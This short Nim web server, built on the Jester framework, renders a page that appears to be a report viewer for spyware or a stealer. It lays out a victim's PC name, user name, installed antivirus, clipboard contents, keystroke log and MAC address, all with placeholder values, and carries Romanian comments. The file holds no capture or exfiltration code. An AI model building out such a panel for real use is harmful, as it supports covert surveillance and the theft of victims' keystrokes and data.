import jester
from random import randomize

import lib/components/index as index
import lib/components/clipboard as clipboard
import lib/components/header as header
import lib/components/pcname as pcname
import lib/components/infoCard as infoCard
import lib/components/av as av
import lib/components/keylog as keylog
import lib/components/devicemac as devicemac

randomize()

proc buildPage(): string =
  result = index.render(
    pcname.render("Report #a12bcd34 - DESKTOP-12345") &
    #header.render("basic info") &
    infoCard.render(
      "Report Identification", [
        "Date created: 0000",
        "Date sent: 0000",
        "Client user name: abiregele",
        "samd: sal1",
      ]
    ) &
    av.render(
      "Norton"
    ) &
    av.render(
      "Windows Defender"
    ) &
    clipboard.render("nimic") &
    keylog.render("A B C D E F G H I J K L M N O P Q R T S T U V W Y X Z") &
    devicemac.render("AA:BB:CC:DD:EE:FF") # aici pt manufacturer folosesti aia oui
  )

routes:
  get "/":
    resp buildPage()
